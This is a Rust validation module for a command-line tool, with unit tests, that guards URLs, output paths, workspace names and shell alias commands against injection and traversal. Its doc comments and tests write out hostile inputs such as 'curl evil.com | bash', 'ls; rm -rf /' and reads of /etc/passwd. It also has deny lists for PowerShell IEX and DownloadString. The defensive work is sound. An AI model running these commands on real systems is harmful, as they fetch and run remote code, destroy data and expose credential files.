// Validation module for security and input sanitization
// This module provides reusable validation functions for URLs, paths, and other inputs

use anyhow::{anyhow, ensure, Context, Result};
use regex::Regex;
use std::path::Path;
use url::Url;

/// Maximum URL length to prevent DoS attacks
const MAX_URL_LENGTH: usize = 2048;

/// Maximum output filename length
const MAX_OUTPUT_LENGTH: usize = 255;

/// Validates a URL for vget command
///
/// Uses the `url` crate for robust URL parsing instead of manual validation.
/// This validates:
/// - URL format (syntax, encoding, etc.)
/// - Protocol must be http or https
/// - Must have a valid hostname
/// - Length limit to prevent DoS
/// - No command injection characters
///
/// # Defense in Depth
/// While Command::arg() provides protection against shell interpretation,
/// we also validate the URL itself to block malicious characters.
/// This prevents attacks even if the URL is used in other contexts.
///
/// # Safety
/// This function uses multiple layers of protection:
/// 1. URL parsing to validate format
/// 2. Character validation to block injection attempts
/// 3. Command::arg() at execution time
pub fn validate_url(url_str: &str) -> Result<()> {
    let trimmed = url_str.trim();

    ensure!(!trimmed.is_empty(), "URL cannot be empty");
    ensure!(
        url_str.len() <= MAX_URL_LENGTH,
        "URL is too long ({} characters, max {})",
        url_str.len(),
        MAX_URL_LENGTH
    );

    // Check protocol is lowercase (strict validation)
    // While browsers normalize, we reject uppercase for consistency
    ensure!(
        url_str.starts_with("http://") || url_str.starts_with("https://"),
        "URL must start with lowercase http:// or https://"
    );

    // Check for null bytes
    ensure!(
        !url_str.contains('\0'),
        "URL contains null byte - security risk"
    );

    // Check for command injection characters
    // These characters are dangerous if the URL is used in shell contexts
    const DANGEROUS_CHARS: &[(&str, &str)] = &[
        (";", "command separator - prevents command injection"),
        ("|", "pipe operator - prevents command injection"),
        ("`", "command substitution - prevents command injection"),
        ("\n", "newline - prevents multi-line injection"),
        ("\r", "carriage return - prevents injection"),
    ];

    for (ch, reason) in DANGEROUS_CHARS {
        ensure!(
            !url_str.contains(ch),
            "URL contains dangerous character '{}' - {}",
            ch,
            reason
        );
    }

    // Check for command substitution patterns
    ensure!(
        !url_str.contains("$("),
        "URL contains command substitution pattern $() - prevents code execution"
    );

    // Check for shell operators with spaces (distinguishes from valid query params)
    // "https://example.com & whoami" is malicious
    // "https://example.com?a=1&b=2" is valid
    ensure!(
        !url_str.contains("& ") && !url_str.contains(" &"),
        "URL contains shell operator with space - prevents command injection"
    );
    ensure!(
        !url_str.contains("&& "),
        "URL contains shell AND operator - prevents command injection"
    );
    ensure!(
        !url_str.contains("|| "),
        "URL contains shell OR operator - prevents command injection"
    );

    // Parse URL using the url crate - validates format, encoding, etc.
    let url = Url::parse(url_str).context("Invalid URL format")?;

    // Validate protocol - only http/https for security
    let scheme = url.scheme();
    ensure!(
        scheme == "http" || scheme == "https",
        "URL must use http or https protocol, got: {}",
        scheme
    );

    // Validate hostname exists
    ensure!(url.host_str().is_some(), "URL has no hostname");

    Ok(())
}

/// Validates an output path for vget command
/// Checks for:
/// - Path traversal (..)
/// - Absolute paths
/// - Drive letters (Windows)
/// - Null bytes
/// - Command injection characters
pub fn validate_output_path(output: &str) -> Result<()> {
    let trimmed = output.trim();
    ensure!(!trimmed.is_empty(), "Output path cannot be empty");
    ensure!(
        !output.contains(".."),
        "Output path contains path traversal (..) - security risk"
    );
    ensure!(
        !output.starts_with('/') && !output.starts_with('\\'),
        "Output path should be relative, not absolute: {}",
        output
    );

    // Check for drive letters on Windows (C:, D:, etc.)
    if output.len() >= 2 {
        ensure!(
            output.chars().nth(1) != Some(':'),
            "Output path should not contain drive letters: {}",
            output
        );
    }

    ensure!(
        !output.contains('\0'),
        "Output path contains null byte - security risk"
    );

    // Check for dangerous characters
    const DANGEROUS_CHARS: [char; 7] = ['|', '&', ';', '$', '`', '\n', '\r'];
    for ch in DANGEROUS_CHARS {
        ensure!(
            !output.contains(ch),
            "Output path contains dangerous character '{}' - potential command injection",
            ch
        );
    }

    ensure!(
        output.len() <= MAX_OUTPUT_LENGTH,
        "Output path is too long ({} characters, max {})",
        output.len(),
        MAX_OUTPUT_LENGTH
    );

    Ok(())
}

/// Validates a directory path for set work/video commands
/// Checks for:
/// - Empty paths
/// - Whitespace-only paths
/// - Path pointing to a file instead of directory
/// - Path with dangerous characters
pub fn validate_directory_path(path: &str) -> Result<()> {
    let trimmed = path.trim();
    ensure!(
        !trimmed.is_empty(),
        "Path cannot be empty or whitespace-only"
    );

    let path_buf = Path::new(path);

    // If path exists, verify it's a directory and not a file
    if path_buf.exists() {
        ensure!(
            !path_buf.is_file(),
            "Path points to a file, not a directory: {}",
            path
        );
        ensure!(path_buf.is_dir(), "Path is not a valid directory: {}", path);

        // Check for common file extensions (extra safety)
        if let Some(extension) = path_buf.extension() {
            const FILE_EXTENSIONS: [&str; 22] = [
                "exe", "bin", "dll", "so", "dylib", "png", "jpg", "jpeg", "gif", "bmp", "svg",
                "zip", "tar", "gz", "7z", "rar", "mp4", "avi", "mkv", "txt", "doc", "pdf",
            ];

            let ext_str = extension.to_string_lossy().to_lowercase();
            ensure!(
                !FILE_EXTENSIONS.contains(&ext_str.as_str()),
                "Path has file extension '{}', expected directory: {}",
                ext_str,
                path
            );
        }
    }

    ensure!(
        !path.contains('\0'),
        "Path contains null byte - security risk"
    );

    Ok(())
}

/// Sanitizes a workspace name
/// Removes or replaces dangerous characters
pub fn validate_workspace_name(name: &str) -> Result<()> {
    // Check for empty
    if name.trim().is_empty() {
        return Err(anyhow!("Workspace name cannot be empty"));
    }

    // Check for null bytes
    if name.contains('\0') {
        return Err(anyhow!("Workspace name contains null byte"));
    }

    // Check for path separators (workspace names should not contain paths)
    if name.contains('/') || name.contains('\\') {
        return Err(anyhow!(
            "Workspace name cannot contain path separators: {}",
            name
        ));
    }

    // Check for command injection characters
    let dangerous_chars = [';', '|', '&', '$', '`', '\n', '\r'];
    for ch in dangerous_chars {
        if name.contains(ch) {
            return Err(anyhow!(
                "Workspace name contains dangerous character '{}': {}",
                ch,
                name
            ));
        }
    }

    // Check length (reasonable limit)
    if name.len() > 100 {
        return Err(anyhow!("Workspace name is too long (max 100 characters)"));
    }

    Ok(())
}

/// Validates an alias command to prevent command injection attacks
///
/// This is CRITICAL for security. Alias commands are written to executable scripts
/// (bash scripts on Unix, shim executables on Windows) and executed by the shell.
///
/// CRITICAL VULNERABILITIES if not validated:
/// - Command injection through semicolons (;)
/// - Command chaining through && or ||
/// - Command substitution through $() or backticks
/// - Backgrounding malicious processes (&)
/// - Pipe to arbitrary commands (|)
/// - Output redirection to sensitive files (>, >>)
///
/// # Security Model
/// We use a STRICT whitelist approach:
/// - Only alphanumeric characters, spaces, hyphens, underscores, forward slashes, and dots
/// - NO shell metacharacters allowed
/// - This prevents ALL injection attacks while allowing normal commands
///
/// # Examples
/// Valid commands:
/// - "ls -la"
/// - "python3 script.py"
/// - "git status"
/// - "cargo build --release"
///
/// Invalid commands (injection attempts):
/// - "ls; rm -rf /" (semicolon separator)
/// - "echo `whoami`" (command substitution)
/// - "curl evil.com | bash" (pipe to shell)
/// - "cat file > /etc/passwd" (redirection)
pub fn validate_alias_command(command: &str) -> Result<()> {
    let _safe_regex = match Regex::new(r"^[a-zA-Z0-9\s\-_./]+$") {
        Ok(r) => r,
        Err(_) => return Err(anyhow::anyhow!("Internal regex error")),
    };

    let trimmed = command.trim();

    // Basic checks
    ensure!(!trimmed.is_empty(), "Alias command cannot be empty");
    ensure!(
        !command.contains('\0'),
        "Alias command contains null byte - security risk"
    );

    // 1. CRITICAL: Implementar el Whitelisting Estricto
    // Si la cadena contiene CUALQUIER COSA fuera de la lista segura, es rechazado.
    ensure!(
        !command.contains(';'),
        "Alias command contains semicolon (;) - CRITICAL COMMAND SEPARATOR"
    );
    ensure!(
        !command.contains('|'),
        "Alias command contains pipe operator (|) - CRITICAL COMMAND CHAINING"
    );
    ensure!(
        !command.contains('&'),
        "Alias command contains ampersand (&) - CRITICAL BACKGROUND/CHAINING"
    );

    // CRITICAL: Check for command injection characters
    // Using a whitelist approach - only allow safe characters
    const DANGEROUS_KEYWORDS: &[(&str, &str)] = &[
        // Comando Chaining / Separadores
        (";", "command separator"),
        ("|", "pipe operator"),
        ("&&", "AND chaining operator"),
        ("||", "OR chaining operator"),
        ("&", "background/chaining operator"),
        // Sustitución / Variables / Redirección
        ("`", "backtick command substitution"),
        ("$(", "dollar-paren command substitution"),
        ("$", "variable/command substitution"),
        (">", "output redirection"),
        ("<", "input redirection"),
        // Wildcards / Expansión
        ("*", "wildcard/globbing"),
        ("?", "wildcard/globbing"),
        ("[", "wildcard/globbing"),
        ("]", "wildcard/globbing"),
        ("~", "home directory expansion"),
        // Estructuras / Evasión
        ("\n", "newline"),
        ("\r", "carriage return"),
        ("(", "subshell / grouping"),
        (")", "subshell / grouping"),
        ("{", "brace expansion / grouping"),
        ("}", "brace expansion / grouping"),
        ("!", "history expansion"),
    ];

    for (ch, reason) in DANGEROUS_KEYWORDS {
        ensure!(
            !command.contains(ch),
            "Alias command contains dangerous character '{}' - {}",
            ch,
            reason
        );
    }

    // 2. Fallo de seguridad potencial: Caracteres en blanco (Whitespace) que no son espacios
    // Bash puede usar tabs (`\t`) y otros caracteres invisibles como separadores.
    ensure!(
        !command.contains('\t'),
        "Alias command contains tab character - potential injection evasion"
    );

    // 3. Fallo de seguridad: Uso de comillas (Quotes)
    ensure!(
        !command.contains('"') && !command.contains('\''),
        "Alias command contains quotes (' or \") - highly prone to injection and expansion issues"
    );

    // Additional pattern checks for obfuscated attacks (Mantener)
    ensure!(
        !command.contains("exec"),
        "Alias command contains 'exec' keyword - potential code execution"
    );
    ensure!(
        !command.contains("eval"),
        "Alias command contains 'eval' keyword - potential code execution"
    );

    // Length check
    ensure!(
        command.len() <= 500,
        "Alias command is too long ({} characters, max 500)",
        command.len()
    );

    Ok(())
}

/// Validates an alias command specifically for Windows environments
///
/// Windows has different shell metacharacters and injection vectors:
/// - PowerShell injection through quotes and special chars
/// - CMD.exe injection through batch operators
/// - File path manipulation with UNC paths
///
/// NOTE: Unlike Unix, backslashes are allowed in Windows commands
/// since they are the standard path separator (e.g., C:\Users\Documents)
pub fn validate_alias_command_windows(command: &str) -> Result<()> {
    let trimmed = command.trim();

    // Basic checks
    ensure!(!trimmed.is_empty(), "Alias command cannot be empty");
    ensure!(
        !command.contains('\0'),
        "Alias command contains null byte - security risk"
    );

    // CRITICAL: Check for command injection characters (WINDOWS-SPECIFIC)
    // Note: Backslash (\) is NOT included because it's needed for Windows paths
    const DANGEROUS_CHARS: &[(&str, &str)] = &[
        (";", "command separator - prevents command injection"),
        ("|", "pipe operator - prevents command injection"),
        (
            "&",
            "background/chaining operator - prevents command injection",
        ),
        ("`", "command substitution - prevents command injection"),
        (
            "$",
            "variable/command substitution - prevents command injection",
        ),
        (">", "output redirection - prevents file manipulation"),
        ("<", "input redirection - prevents file manipulation"),
        ("\n", "newline - prevents multi-line injection"),
        ("\r", "carriage return - prevents injection"),
        ("(", "subshell - prevents command substitution"),
        (")", "subshell - prevents command substitution"),
        ("{", "brace expansion - prevents injection"),
        ("}", "brace expansion - prevents injection"),
        ("*", "wildcard - prevents unexpected file operations"),
        ("?", "wildcard - prevents unexpected file operations"),
        ("[", "wildcard - prevents unexpected file operations"),
        ("]", "wildcard - prevents unexpected file operations"),
        ("!", "history expansion - prevents injection"),
        ("~", "home directory expansion - prevents path manipulation"),
    ];

    for (ch, reason) in DANGEROUS_CHARS {
        ensure!(
            !command.contains(ch),
            "Alias command contains dangerous character '{}' - {}",
            ch,
            reason
        );
    }

    // Windows-specific dangerous characters
    const WINDOWS_DANGEROUS: &[(&str, &str)] = &[
        ("%", "batch variable expansion - prevents injection"),
        ("^", "CMD escape character - prevents bypass"),
    ];

    for (ch, reason) in WINDOWS_DANGEROUS {
        ensure!(
            !command.contains(ch),
            "Windows alias command contains dangerous character '{}' - {}",
            ch,
            reason
        );
    }

    // Additional pattern checks for obfuscated attacks
    ensure!(
        !command.contains("exec"),
        "Alias command contains 'exec' keyword - potential code execution"
    );
    ensure!(
        !command.contains("eval"),
        "Alias command contains 'eval' keyword - potential code execution"
    );

    // Check for PowerShell-specific patterns
    ensure!(
        !command.to_lowercase().contains("invoke-expression"),
        "Command contains PowerShell Invoke-Expression - code execution risk"
    );
    ensure!(
        !command.to_lowercase().contains("iex"),
        "Command contains PowerShell IEX - code execution risk"
    );
    ensure!(
        !command.to_lowercase().contains("downloadstring"),
        "Command contains DownloadString - remote code execution risk"
    );

    // Length check
    ensure!(
        command.len() <= 500,
        "Alias command is too long ({} characters, max 500)",
        command.len()
    );

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_url_valid() {
        let valid_urls = vec![
            "https://www.youtube.com/watch?v=abc",
            "http://example.com",
            "https://example.com:8080/path",
            "https://example.com/path?foo=bar&baz=qux", // & is valid in query params
        ];

        for url in valid_urls {
            assert!(validate_url(url).is_ok(), "Should accept: {}", url);
        }
    }

    #[test]
    fn test_validate_url_invalid() {
        let invalid_urls = vec![
            "",                  // Empty
            "ftp://example.com", // Wrong protocol
            "https://",          // No hostname
            "not-a-url",         // Invalid format
            "http://",           // No hostname
            "//example.com",     // No scheme
        ];

        for url in invalid_urls {
            assert!(validate_url(url).is_err(), "Should reject: {}", url);
        }
    }

    #[test]
    fn test_validate_url_too_long() {
        let long_url = format!("https://example.com/{}", "a".repeat(3000));
        assert!(
            validate_url(&long_url).is_err(),
            "Should reject URL longer than MAX_URL_LENGTH"
        );
    }

    #[test]
    fn test_validate_output_path_valid() {
        let valid_paths = vec!["video", "my-video.mp4", "videos/lecture1"];

        for path in valid_paths {
            assert!(
                validate_output_path(path).is_ok(),
                "Should accept: {}",
                path
            );
        }
    }

    #[test]
    fn test_validate_output_path_invalid() {
        let invalid_paths = vec![
            "../../../etc/passwd",
            "/etc/passwd",
            "C:\\Windows",
            "video; rm -rf /",
        ];

        for path in invalid_paths {
            assert!(
                validate_output_path(path).is_err(),
                "Should reject: {}",
                path
            );
        }
    }

    #[test]
    fn test_validate_workspace_name_valid() {
        let valid_names = vec!["my-project", "work_2024", "client-site"];

        for name in valid_names {
            assert!(
                validate_workspace_name(name).is_ok(),
                "Should accept: {}",
                name
            );
        }
    }

    #[test]
    fn test_validate_workspace_name_invalid() {
        let invalid_names = vec!["", "name/with/slash", "name; rm -rf /", "name\0null"];

        for name in invalid_names {
            assert!(
                validate_workspace_name(name).is_err(),
                "Should reject: {}",
                name
            );
        }
    }

    #[test]
    fn test_validate_alias_command_valid() {
        let valid_commands = vec![
            "ls -la",
            "git status",
            "cargo build --release",
            "python3 script.py",
            "node index.js",
            "echo hello",
        ];

        for cmd in valid_commands {
            assert!(
                validate_alias_command(cmd).is_ok(),
                "Should accept valid command: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_validate_alias_command_injection() {
        let malicious_commands = vec![
            "ls; rm -rf /",
            "echo `whoami`",
            "echo $(cat /etc/passwd)",
            "curl evil.com | bash",
            "cat file > /etc/passwd",
            "sleep 1 &",
            "echo && malicious",
            "test || dangerous",
            "ls -la; curl http://attacker.com",
        ];

        for cmd in malicious_commands {
            assert!(
                validate_alias_command(cmd).is_err(),
                "Should reject malicious command: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_validate_alias_command_wildcards() {
        let wildcard_commands = vec!["rm -rf *", "cat *.txt", "ls [abc]", "echo test?"];

        for cmd in wildcard_commands {
            assert!(
                validate_alias_command(cmd).is_err(),
                "Should reject wildcard command: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_validate_alias_command_windows_valid() {
        let valid_commands = vec!["dir", "notepad file.txt", "python script.py"];

        for cmd in valid_commands {
            assert!(
                validate_alias_command_windows(cmd).is_ok(),
                "Should accept valid Windows command: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_validate_alias_command_windows_injection() {
        let malicious_commands = vec![
            "notepad & calc.exe",
            "echo %PATH%",
            "dir ^& malicious",
            "powershell -c IEX",
            "cmd /c downloadstring",
        ];

        for cmd in malicious_commands {
            assert!(
                validate_alias_command_windows(cmd).is_err(),
                "Should reject malicious Windows command: {}",
                cmd
            );
        }
    }
}
